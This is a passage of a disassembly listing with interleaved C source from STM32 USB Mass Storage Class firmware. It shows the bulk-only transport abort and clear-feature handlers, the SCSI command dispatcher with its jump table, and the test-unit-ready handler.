 80096ae:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80096b2:	687b      	ldr	r3, [r7, #4]
 80096b4:	32b0      	adds	r2, #176	; 0xb0
 80096b6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80096ba:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80096bc:	68fb      	ldr	r3, [r7, #12]
 80096be:	2b00      	cmp	r3, #0
 80096c0:	d02c      	beq.n	800971c <MSC_BOT_Abort+0x78>
  {
    return;
  }

  if ((hmsc->cbw.bmFlags == 0U) &&
 80096c2:	68fb      	ldr	r3, [r7, #12]
 80096c4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096c8:	7f1b      	ldrb	r3, [r3, #28]
 80096ca:	2b00      	cmp	r3, #0
 80096cc:	d10f      	bne.n	80096ee <MSC_BOT_Abort+0x4a>
      (hmsc->cbw.dDataLength != 0U) &&
 80096ce:	68fb      	ldr	r3, [r7, #12]
 80096d0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096d4:	699b      	ldr	r3, [r3, #24]
  if ((hmsc->cbw.bmFlags == 0U) &&
 80096d6:	2b00      	cmp	r3, #0
 80096d8:	d009      	beq.n	80096ee <MSC_BOT_Abort+0x4a>
      (hmsc->bot_status == USBD_BOT_STATUS_NORMAL))
 80096da:	68fb      	ldr	r3, [r7, #12]
 80096dc:	7a5b      	ldrb	r3, [r3, #9]
      (hmsc->cbw.dDataLength != 0U) &&
 80096de:	2b00      	cmp	r3, #0
 80096e0:	d105      	bne.n	80096ee <MSC_BOT_Abort+0x4a>
  {
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 80096e2:	4b10      	ldr	r3, [pc, #64]	; (8009724 <MSC_BOT_Abort+0x80>)
 80096e4:	781b      	ldrb	r3, [r3, #0]
 80096e6:	4619      	mov	r1, r3
 80096e8:	6878      	ldr	r0, [r7, #4]
 80096ea:	f003 faa7 	bl	800cc3c <USBD_LL_StallEP>
  }

  (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 80096ee:	4b0e      	ldr	r3, [pc, #56]	; (8009728 <MSC_BOT_Abort+0x84>)
 80096f0:	781b      	ldrb	r3, [r3, #0]
 80096f2:	4619      	mov	r1, r3
 80096f4:	6878      	ldr	r0, [r7, #4]
 80096f6:	f003 faa1 	bl	800cc3c <USBD_LL_StallEP>

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR)
 80096fa:	68fb      	ldr	r3, [r7, #12]
 80096fc:	7a5b      	ldrb	r3, [r3, #9]
 80096fe:	2b02      	cmp	r3, #2
 8009700:	d10d      	bne.n	800971e <MSC_BOT_Abort+0x7a>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 8009702:	4b09      	ldr	r3, [pc, #36]	; (8009728 <MSC_BOT_Abort+0x84>)
 8009704:	781b      	ldrb	r3, [r3, #0]
 8009706:	4619      	mov	r1, r3
 8009708:	6878      	ldr	r0, [r7, #4]
 800970a:	f003 fa97 	bl	800cc3c <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800970e:	4b05      	ldr	r3, [pc, #20]	; (8009724 <MSC_BOT_Abort+0x80>)
 8009710:	781b      	ldrb	r3, [r3, #0]
 8009712:	4619      	mov	r1, r3
 8009714:	6878      	ldr	r0, [r7, #4]
 8009716:	f003 fa91 	bl	800cc3c <USBD_LL_StallEP>
 800971a:	e000      	b.n	800971e <MSC_BOT_Abort+0x7a>
    return;
 800971c:	bf00      	nop
  }
}
 800971e:	3710      	adds	r7, #16
 8009720:	46bd      	mov	sp, r7
 8009722:	bd80      	pop	{r7, pc}
 8009724:	2000010b 	.word	0x2000010b
 8009728:	2000010a 	.word	0x2000010a

0800972c <MSC_BOT_CplClrFeature>:
  * @param  epnum: endpoint index
  * @retval None
  */

void  MSC_BOT_CplClrFeature(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800972c:	b580      	push	{r7, lr}
 800972e:	b084      	sub	sp, #16
 8009730:	af00      	add	r7, sp, #0
 8009732:	6078      	str	r0, [r7, #4]
 8009734:	460b      	mov	r3, r1
 8009736:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009738:	687b      	ldr	r3, [r7, #4]
 800973a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800973e:	687b      	ldr	r3, [r7, #4]
 8009740:	32b0      	adds	r2, #176	; 0xb0
 8009742:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009746:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009748:	68fb      	ldr	r3, [r7, #12]
 800974a:	2b00      	cmp	r3, #0
 800974c:	d01d      	beq.n	800978a <MSC_BOT_CplClrFeature+0x5e>
  {
    return;
  }

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR) /* Bad CBW Signature */
 800974e:	68fb      	ldr	r3, [r7, #12]
 8009750:	7a5b      	ldrb	r3, [r3, #9]
 8009752:	2b02      	cmp	r3, #2
 8009754:	d10c      	bne.n	8009770 <MSC_BOT_CplClrFeature+0x44>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 8009756:	4b10      	ldr	r3, [pc, #64]	; (8009798 <MSC_BOT_CplClrFeature+0x6c>)
 8009758:	781b      	ldrb	r3, [r3, #0]
 800975a:	4619      	mov	r1, r3
 800975c:	6878      	ldr	r0, [r7, #4]
 800975e:	f003 fa6d 	bl	800cc3c <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 8009762:	4b0e      	ldr	r3, [pc, #56]	; (800979c <MSC_BOT_CplClrFeature+0x70>)
 8009764:	781b      	ldrb	r3, [r3, #0]
 8009766:	4619      	mov	r1, r3
 8009768:	6878      	ldr	r0, [r7, #4]
 800976a:	f003 fa67 	bl	800cc3c <USBD_LL_StallEP>
 800976e:	e00f      	b.n	8009790 <MSC_BOT_CplClrFeature+0x64>
  }
  else if (((epnum & 0x80U) == 0x80U) && (hmsc->bot_status != USBD_BOT_STATUS_RECOVERY))
 8009770:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8009774:	2b00      	cmp	r3, #0
 8009776:	da0a      	bge.n	800978e <MSC_BOT_CplClrFeature+0x62>
 8009778:	68fb      	ldr	r3, [r7, #12]
 800977a:	7a5b      	ldrb	r3, [r3, #9]
 800977c:	2b01      	cmp	r3, #1
 800977e:	d006      	beq.n	800978e <MSC_BOT_CplClrFeature+0x62>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009780:	2101      	movs	r1, #1
 8009782:	6878      	ldr	r0, [r7, #4]
 8009784:	f7ff ff4e 	bl	8009624 <MSC_BOT_SendCSW>
 8009788:	e002      	b.n	8009790 <MSC_BOT_CplClrFeature+0x64>
    return;
 800978a:	bf00      	nop
 800978c:	e000      	b.n	8009790 <MSC_BOT_CplClrFeature+0x64>
  }
  else
  {
    return;
 800978e:	bf00      	nop
  }
}
 8009790:	3710      	adds	r7, #16
 8009792:	46bd      	mov	sp, r7
 8009794:	bd80      	pop	{r7, pc}
 8009796:	bf00      	nop
 8009798:	2000010a 	.word	0x2000010a
 800979c:	2000010b 	.word	0x2000010b

080097a0 <SCSI_ProcessCmd>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
int8_t SCSI_ProcessCmd(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *cmd)
{
 80097a0:	b580      	push	{r7, lr}
 80097a2:	b086      	sub	sp, #24
 80097a4:	af00      	add	r7, sp, #0
 80097a6:	60f8      	str	r0, [r7, #12]
 80097a8:	460b      	mov	r3, r1
 80097aa:	607a      	str	r2, [r7, #4]
 80097ac:	72fb      	strb	r3, [r7, #11]
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80097ae:	68fb      	ldr	r3, [r7, #12]
 80097b0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80097b4:	68fb      	ldr	r3, [r7, #12]
 80097b6:	32b0      	adds	r2, #176	; 0xb0
 80097b8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80097bc:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 80097be:	693b      	ldr	r3, [r7, #16]
 80097c0:	2b00      	cmp	r3, #0
 80097c2:	d102      	bne.n	80097ca <SCSI_ProcessCmd+0x2a>
  {
    return -1;
 80097c4:	f04f 33ff 	mov.w	r3, #4294967295
 80097c8:	e168      	b.n	8009a9c <SCSI_ProcessCmd+0x2fc>
  }

  switch (cmd[0])
 80097ca:	687b      	ldr	r3, [r7, #4]
 80097cc:	781b      	ldrb	r3, [r3, #0]
 80097ce:	2baa      	cmp	r3, #170	; 0xaa
 80097d0:	f000 8144 	beq.w	8009a5c <SCSI_ProcessCmd+0x2bc>
 80097d4:	2baa      	cmp	r3, #170	; 0xaa
 80097d6:	f300 8153 	bgt.w	8009a80 <SCSI_ProcessCmd+0x2e0>
 80097da:	2ba8      	cmp	r3, #168	; 0xa8
 80097dc:	f000 812c 	beq.w	8009a38 <SCSI_ProcessCmd+0x298>
 80097e0:	2ba8      	cmp	r3, #168	; 0xa8
 80097e2:	f300 814d 	bgt.w	8009a80 <SCSI_ProcessCmd+0x2e0>
 80097e6:	2b5a      	cmp	r3, #90	; 0x5a
 80097e8:	f300 80c0 	bgt.w	800996c <SCSI_ProcessCmd+0x1cc>
 80097ec:	2b00      	cmp	r3, #0
 80097ee:	f2c0 8147 	blt.w	8009a80 <SCSI_ProcessCmd+0x2e0>
 80097f2:	2b5a      	cmp	r3, #90	; 0x5a
 80097f4:	f200 8144 	bhi.w	8009a80 <SCSI_ProcessCmd+0x2e0>
 80097f8:	a201      	add	r2, pc, #4	; (adr r2, 8009800 <SCSI_ProcessCmd+0x60>)
 80097fa:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80097fe:	bf00      	nop
 8009800:	08009973 	.word	0x08009973
 8009804:	08009a81 	.word	0x08009a81
 8009808:	08009a81 	.word	0x08009a81
 800980c:	08009985 	.word	0x08009985
 8009810:	08009a81 	.word	0x08009a81
 8009814:	08009a81 	.word	0x08009a81
 8009818:	08009a81 	.word	0x08009a81
 800981c:	08009a81 	.word	0x08009a81
 8009820:	08009a81 	.word	0x08009a81
 8009824:	08009a81 	.word	0x08009a81
 8009828:	08009a81 	.word	0x08009a81
 800982c:	08009a81 	.word	0x08009a81
 8009830:	08009a81 	.word	0x08009a81
 8009834:	08009a81 	.word	0x08009a81
 8009838:	08009a81 	.word	0x08009a81
 800983c:	08009a81 	.word	0x08009a81
 8009840:	08009a81 	.word	0x08009a81
 8009844:	08009a81 	.word	0x08009a81
 8009848:	08009997 	.word	0x08009997
 800984c:	08009a81 	.word	0x08009a81
 8009850:	08009a81 	.word	0x08009a81
 8009854:	08009a81 	.word	0x08009a81
 8009858:	08009a81 	.word	0x08009a81
 800985c:	08009a81 	.word	0x08009a81
 8009860:	08009a81 	.word	0x08009a81
 8009864:	08009a81 	.word	0x08009a81
 8009868:	080099cd 	.word	0x080099cd
 800986c:	080099a9 	.word	0x080099a9
 8009870:	08009a81 	.word	0x08009a81
 8009874:	08009a81 	.word	0x08009a81
 8009878:	080099bb 	.word	0x080099bb
 800987c:	08009a81 	.word	0x08009a81
 8009880:	08009a81 	.word	0x08009a81
 8009884:	08009a81 	.word	0x08009a81
 8009888:	08009a81 	.word	0x08009a81
 800988c:	080099f1 	.word	0x080099f1
 8009890:	08009a81 	.word	0x08009a81
 8009894:	08009a03 	.word	0x08009a03
 8009898:	08009a81 	.word	0x08009a81
 800989c:	08009a81 	.word	0x08009a81
 80098a0:	08009a27 	.word	0x08009a27
 80098a4:	08009a81 	.word	0x08009a81
 80098a8:	08009a4b 	.word	0x08009a4b
 80098ac:	08009a81 	.word	0x08009a81
 80098b0:	08009a81 	.word	0x08009a81
 80098b4:	08009a81 	.word	0x08009a81
 80098b8:	08009a81 	.word	0x08009a81
 80098bc:	08009a6f 	.word	0x08009a6f
 80098c0:	08009a81 	.word	0x08009a81
 80098c4:	08009a81 	.word	0x08009a81
 80098c8:	08009a81 	.word	0x08009a81
 80098cc:	08009a81 	.word	0x08009a81
 80098d0:	08009a81 	.word	0x08009a81
 80098d4:	08009a81 	.word	0x08009a81
 80098d8:	08009a81 	.word	0x08009a81
 80098dc:	08009a81 	.word	0x08009a81
 80098e0:	08009a81 	.word	0x08009a81
 80098e4:	08009a81 	.word	0x08009a81
 80098e8:	08009a81 	.word	0x08009a81
 80098ec:	08009a81 	.word	0x08009a81
 80098f0:	08009a81 	.word	0x08009a81
 80098f4:	08009a81 	.word	0x08009a81
 80098f8:	08009a81 	.word	0x08009a81
 80098fc:	08009a81 	.word	0x08009a81
 8009900:	08009a81 	.word	0x08009a81
 8009904:	08009a81 	.word	0x08009a81
 8009908:	08009a81 	.word	0x08009a81
 800990c:	08009a81 	.word	0x08009a81
 8009910:	08009a81 	.word	0x08009a81
 8009914:	08009a81 	.word	0x08009a81
 8009918:	08009a81 	.word	0x08009a81
 800991c:	08009a81 	.word	0x08009a81
 8009920:	08009a81 	.word	0x08009a81
 8009924:	08009a81 	.word	0x08009a81
 8009928:	08009a81 	.word	0x08009a81
 800992c:	08009a81 	.word	0x08009a81
 8009930:	08009a81 	.word	0x08009a81
 8009934:	08009a81 	.word	0x08009a81
 8009938:	08009a81 	.word	0x08009a81
 800993c:	08009a81 	.word	0x08009a81
 8009940:	08009a81 	.word	0x08009a81
 8009944:	08009a81 	.word	0x08009a81
 8009948:	08009a81 	.word	0x08009a81
 800994c:	08009a81 	.word	0x08009a81
 8009950:	08009a81 	.word	0x08009a81
 8009954:	08009a81 	.word	0x08009a81
 8009958:	08009a81 	.word	0x08009a81
 800995c:	08009a81 	.word	0x08009a81
 8009960:	08009a81 	.word	0x08009a81
 8009964:	08009a81 	.word	0x08009a81
 8009968:	080099df 	.word	0x080099df
 800996c:	2b9e      	cmp	r3, #158	; 0x9e
 800996e:	d051      	beq.n	8009a14 <SCSI_ProcessCmd+0x274>
 8009970:	e086      	b.n	8009a80 <SCSI_ProcessCmd+0x2e0>
  {
    case SCSI_TEST_UNIT_READY:
      ret = SCSI_TestUnitReady(pdev, lun, cmd);
 8009972:	7afb      	ldrb	r3, [r7, #11]
 8009974:	687a      	ldr	r2, [r7, #4]
 8009976:	4619      	mov	r1, r3
 8009978:	68f8      	ldr	r0, [r7, #12]
 800997a:	f000 f893 	bl	8009aa4 <SCSI_TestUnitReady>
 800997e:	4603      	mov	r3, r0
 8009980:	75fb      	strb	r3, [r7, #23]
      break;
 8009982:	e089      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_REQUEST_SENSE:
      ret = SCSI_RequestSense(pdev, lun, cmd);
 8009984:	7afb      	ldrb	r3, [r7, #11]
 8009986:	687a      	ldr	r2, [r7, #4]
 8009988:	4619      	mov	r1, r3
 800998a:	68f8      	ldr	r0, [r7, #12]
 800998c:	f000 fb9a 	bl	800a0c4 <SCSI_RequestSense>
 8009990:	4603      	mov	r3, r0
 8009992:	75fb      	strb	r3, [r7, #23]
      break;
 8009994:	e080      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_INQUIRY:
      ret = SCSI_Inquiry(pdev, lun, cmd);
 8009996:	7afb      	ldrb	r3, [r7, #11]
 8009998:	687a      	ldr	r2, [r7, #4]
 800999a:	4619      	mov	r1, r3
 800999c:	68f8      	ldr	r0, [r7, #12]
 800999e:	f000 f8df 	bl	8009b60 <SCSI_Inquiry>
 80099a2:	4603      	mov	r3, r0
 80099a4:	75fb      	strb	r3, [r7, #23]
      break;
 80099a6:	e077      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_START_STOP_UNIT:
      ret = SCSI_StartStopUnit(pdev, lun, cmd);
 80099a8:	7afb      	ldrb	r3, [r7, #11]
 80099aa:	687a      	ldr	r2, [r7, #4]
 80099ac:	4619      	mov	r1, r3
 80099ae:	68f8      	ldr	r0, [r7, #12]
 80099b0:	f000 fc7e 	bl	800a2b0 <SCSI_StartStopUnit>
 80099b4:	4603      	mov	r3, r0
 80099b6:	75fb      	strb	r3, [r7, #23]
      break;
 80099b8:	e06e      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_ALLOW_MEDIUM_REMOVAL:
      ret = SCSI_AllowPreventRemovable(pdev, lun, cmd);
 80099ba:	7afb      	ldrb	r3, [r7, #11]
 80099bc:	687a      	ldr	r2, [r7, #4]
 80099be:	4619      	mov	r1, r3
 80099c0:	68f8      	ldr	r0, [r7, #12]
 80099c2:	f000 fcd2 	bl	800a36a <SCSI_AllowPreventRemovable>
 80099c6:	4603      	mov	r3, r0
 80099c8:	75fb      	strb	r3, [r7, #23]
      break;
 80099ca:	e065      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE6:
      ret = SCSI_ModeSense6(pdev, lun, cmd);
 80099cc:	7afb      	ldrb	r3, [r7, #11]
 80099ce:	687a      	ldr	r2, [r7, #4]
 80099d0:	4619      	mov	r1, r3
 80099d2:	68f8      	ldr	r0, [r7, #12]
 80099d4:	f000 fb16 	bl	800a004 <SCSI_ModeSense6>
 80099d8:	4603      	mov	r3, r0
 80099da:	75fb      	strb	r3, [r7, #23]
      break;
 80099dc:	e05c      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE10:
      ret = SCSI_ModeSense10(pdev, lun, cmd);
 80099de:	7afb      	ldrb	r3, [r7, #11]
 80099e0:	687a      	ldr	r2, [r7, #4]
 80099e2:	4619      	mov	r1, r3
 80099e4:	68f8      	ldr	r0, [r7, #12]
 80099e6:	f000 fb3d 	bl	800a064 <SCSI_ModeSense10>
 80099ea:	4603      	mov	r3, r0
 80099ec:	75fb      	strb	r3, [r7, #23]
      break;
 80099ee:	e053      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_FORMAT_CAPACITIES:
      ret = SCSI_ReadFormatCapacity(pdev, lun, cmd);
 80099f0:	7afb      	ldrb	r3, [r7, #11]
 80099f2:	687a      	ldr	r2, [r7, #4]
 80099f4:	4619      	mov	r1, r3
 80099f6:	68f8      	ldr	r0, [r7, #12]
 80099f8:	f000 fa86 	bl	8009f08 <SCSI_ReadFormatCapacity>
 80099fc:	4603      	mov	r3, r0
 80099fe:	75fb      	strb	r3, [r7, #23]
      break;
 8009a00:	e04a      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY10:
      ret = SCSI_ReadCapacity10(pdev, lun, cmd);
 8009a02:	7afb      	ldrb	r3, [r7, #11]
 8009a04:	687a      	ldr	r2, [r7, #4]
 8009a06:	4619      	mov	r1, r3
 8009a08:	68f8      	ldr	r0, [r7, #12]
 8009a0a:	f000 f929 	bl	8009c60 <SCSI_ReadCapacity10>
 8009a0e:	4603      	mov	r3, r0
 8009a10:	75fb      	strb	r3, [r7, #23]
      break;
 8009a12:	e041      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY16:
      ret = SCSI_ReadCapacity16(pdev, lun, cmd);
 8009a14:	7afb      	ldrb	r3, [r7, #11]
 8009a16:	687a      	ldr	r2, [r7, #4]
 8009a18:	4619      	mov	r1, r3
 8009a1a:	68f8      	ldr	r0, [r7, #12]
 8009a1c:	f000 f9af 	bl	8009d7e <SCSI_ReadCapacity16>
 8009a20:	4603      	mov	r3, r0
 8009a22:	75fb      	strb	r3, [r7, #23]
      break;
 8009a24:	e038      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ10:
      ret = SCSI_Read10(pdev, lun, cmd);
 8009a26:	7afb      	ldrb	r3, [r7, #11]
 8009a28:	687a      	ldr	r2, [r7, #4]
 8009a2a:	4619      	mov	r1, r3
 8009a2c:	68f8      	ldr	r0, [r7, #12]
 8009a2e:	f000 fccd 	bl	800a3cc <SCSI_Read10>
 8009a32:	4603      	mov	r3, r0
 8009a34:	75fb      	strb	r3, [r7, #23]
      break;
 8009a36:	e02f      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ12:
      ret = SCSI_Read12(pdev, lun, cmd);
 8009a38:	7afb      	ldrb	r3, [r7, #11]
 8009a3a:	687a      	ldr	r2, [r7, #4]
 8009a3c:	4619      	mov	r1, r3
 8009a3e:	68f8      	ldr	r0, [r7, #12]
 8009a40:	f000 fd7b 	bl	800a53a <SCSI_Read12>
 8009a44:	4603      	mov	r3, r0
 8009a46:	75fb      	strb	r3, [r7, #23]
      break;
 8009a48:	e026      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE10:
      ret = SCSI_Write10(pdev, lun, cmd);
 8009a4a:	7afb      	ldrb	r3, [r7, #11]
 8009a4c:	687a      	ldr	r2, [r7, #4]
 8009a4e:	4619      	mov	r1, r3
 8009a50:	68f8      	ldr	r0, [r7, #12]
 8009a52:	f000 fe33 	bl	800a6bc <SCSI_Write10>
 8009a56:	4603      	mov	r3, r0
 8009a58:	75fb      	strb	r3, [r7, #23]
      break;
 8009a5a:	e01d      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE12:
      ret = SCSI_Write12(pdev, lun, cmd);
 8009a5c:	7afb      	ldrb	r3, [r7, #11]
 8009a5e:	687a      	ldr	r2, [r7, #4]
 8009a60:	4619      	mov	r1, r3
 8009a62:	68f8      	ldr	r0, [r7, #12]
 8009a64:	f000 ff0e 	bl	800a884 <SCSI_Write12>
 8009a68:	4603      	mov	r3, r0
 8009a6a:	75fb      	strb	r3, [r7, #23]
      break;
 8009a6c:	e014      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    case SCSI_VERIFY10:
      ret = SCSI_Verify10(pdev, lun, cmd);
 8009a6e:	7afb      	ldrb	r3, [r7, #11]
 8009a70:	687a      	ldr	r2, [r7, #4]
 8009a72:	4619      	mov	r1, r3
 8009a74:	68f8      	ldr	r0, [r7, #12]
 8009a76:	f000 fff9 	bl	800aa6c <SCSI_Verify10>
 8009a7a:	4603      	mov	r3, r0
 8009a7c:	75fb      	strb	r3, [r7, #23]
      break;
 8009a7e:	e00b      	b.n	8009a98 <SCSI_ProcessCmd+0x2f8>

    default:
      SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_CDB);
 8009a80:	7af9      	ldrb	r1, [r7, #11]
 8009a82:	2320      	movs	r3, #32
 8009a84:	2205      	movs	r2, #5
 8009a86:	68f8      	ldr	r0, [r7, #12]
 8009a88:	f000 fbb6 	bl	800a1f8 <SCSI_SenseCode>
      hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009a8c:	693b      	ldr	r3, [r7, #16]
 8009a8e:	2202      	movs	r2, #2
 8009a90:	725a      	strb	r2, [r3, #9]
      ret = -1;
 8009a92:	23ff      	movs	r3, #255	; 0xff
 8009a94:	75fb      	strb	r3, [r7, #23]
      break;
 8009a96:	bf00      	nop
  }

  return ret;
 8009a98:	f997 3017 	ldrsb.w	r3, [r7, #23]
}
 8009a9c:	4618      	mov	r0, r3
 8009a9e:	3718      	adds	r7, #24
 8009aa0:	46bd      	mov	sp, r7
 8009aa2:	bd80      	pop	{r7, pc}

08009aa4 <SCSI_TestUnitReady>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_TestUnitReady(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009aa4:	b580      	push	{r7, lr}
 8009aa6:	b086      	sub	sp, #24
 8009aa8:	af00      	add	r7, sp, #0
 8009aaa:	60f8      	str	r0, [r7, #12]
 8009aac:	460b      	mov	r3, r1
 8009aae:	607a      	str	r2, [r7, #4]
 8009ab0:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009ab2:	68fb      	ldr	r3, [r7, #12]
 8009ab4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009ab8:	68fb      	ldr	r3, [r7, #12]
 8009aba:	32b0      	adds	r2, #176	; 0xb0
 8009abc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009ac0:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009ac2:	697b      	ldr	r3, [r7, #20]
 8009ac4:	2b00      	cmp	r3, #0
 8009ac6:	d102      	bne.n	8009ace <SCSI_TestUnitReady+0x2a>
  {
    return -1;
 8009ac8:	f04f 33ff 	mov.w	r3, #4294967295
 8009acc:	e043      	b.n	8009b56 <SCSI_TestUnitReady+0xb2>
  }

  /* case 9 : Hi > D0 */
  if (hmsc->cbw.dDataLength != 0U)
 8009ace:	697b      	ldr	r3, [r7, #20]
 8009ad0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ad4:	699b      	ldr	r3, [r3, #24]
 8009ad6:	2b00      	cmp	r3, #0
 8009ad8:	d00b      	beq.n	8009af2 <SCSI_TestUnitReady+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009ada:	697b      	ldr	r3, [r7, #20]
 8009adc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ae0:	7f59      	ldrb	r1, [r3, #29]
 8009ae2:	2320      	movs	r3, #32
 8009ae4:	2205      	movs	r2, #5
 8009ae6:	68f8      	ldr	r0, [r7, #12]
 8009ae8:	f000 fb86 	bl	800a1f8 <SCSI_SenseCode>

    return -1;
 8009aec:	f04f 33ff 	mov.w	r3, #4294967295
 8009af0:	e031      	b.n	8009b56 <SCSI_TestUnitReady+0xb2>
  }

  if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 8009af2:	697b      	ldr	r3, [r7, #20]
 8009af4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009af8:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009afc:	2b02      	cmp	r3, #2
 8009afe:	d10b      	bne.n	8009b18 <SCSI_TestUnitReady+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009b00:	7af9      	ldrb	r1, [r7, #11]
 8009b02:	233a      	movs	r3, #58	; 0x3a
 8009b04:	2202      	movs	r2, #2
 8009b06:	68f8      	ldr	r0, [r7, #12]
 8009b08:	f000 fb76 	bl	800a1f8 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009b0c:	697b      	ldr	r3, [r7, #20]
 8009b0e:	2205      	movs	r2, #5
 8009b10:	721a      	strb	r2, [r3, #8]
    return -1;
 8009b12:	f04f 33ff 	mov.w	r3, #4294967295
 8009b16:	e01e      	b.n	8009b56 <SCSI_TestUnitReady+0xb2>
  }

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 8009b18:	68fb      	ldr	r3, [r7, #12]
 8009b1a:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009b1e:	68fa      	ldr	r2, [r7, #12]
 8009b20:	33b0      	adds	r3, #176	; 0xb0
 8009b22:	009b      	lsls	r3, r3, #2
 8009b24:	4413      	add	r3, r2
 8009b26:	685b      	ldr	r3, [r3, #4]
 8009b28:	689b      	ldr	r3, [r3, #8]
 8009b2a:	7afa      	ldrb	r2, [r7, #11]
 8009b2c:	4610      	mov	r0, r2
 8009b2e:	4798      	blx	r3
 8009b30:	4603      	mov	r3, r0
 8009b32:	2b00      	cmp	r3, #0
 8009b34:	d00b      	beq.n	8009b4e <SCSI_TestUnitReady+0xaa>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009b36:	7af9      	ldrb	r1, [r7, #11]
 8009b38:	233a      	movs	r3, #58	; 0x3a
 8009b3a:	2202      	movs	r2, #2
 8009b3c:	68f8      	ldr	r0, [r7, #12]
 8009b3e:	f000 fb5b 	bl	800a1f8 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009b42:	697b      	ldr	r3, [r7, #20]
 8009b44:	2205      	movs	r2, #5
 8009b46:	721a      	strb	r2, [r3, #8]

    return -1;
 8009b48:	f04f 33ff 	mov.w	r3, #4294967295
 8009b4c:	e003      	b.n	8009b56 <SCSI_TestUnitReady+0xb2>
  }
  hmsc->bot_data_length = 0U;
 8009b4e:	697b      	ldr	r3, [r7, #20]
 8009b50:	2200      	movs	r2, #0
 8009b52:	60da      	str	r2, [r3, #12]

  return 0;
 8009b54:	2300      	movs	r3, #0
}
